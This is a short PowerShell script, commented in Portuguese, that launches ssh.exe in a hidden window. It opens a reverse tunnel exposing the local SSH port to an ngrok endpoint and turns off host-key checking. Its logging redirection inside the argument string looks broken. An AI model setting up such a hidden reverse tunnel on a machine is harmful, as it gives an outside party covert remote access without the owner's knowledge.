# Caminho do SSH
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Users\Testes\.ssh\ssh_key"

# Caminho do log (único arquivo com stdout + stderr)
$logFile = "C:\Users\Testes\.ssh\ssh_verbose_log.txt"

# Monta os argumentos exatamente como no terminal
$arguments = @"
-i `"$keyPath`" `
-o StrictHostKeyChecking=no `
-o ServerAliveInterval=60 `
-o ServerAliveCountMax=3 `
-o ExitOnForwardFailure=yes `
-R 2222:localhost:22 `
u0_a416@0.tcp.sa.ngrok.io -p 18149 -N -vvv *>> `"$logFile`"
"@

# Executa SSH em segundo plano invisível com redirecionamento para log
Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
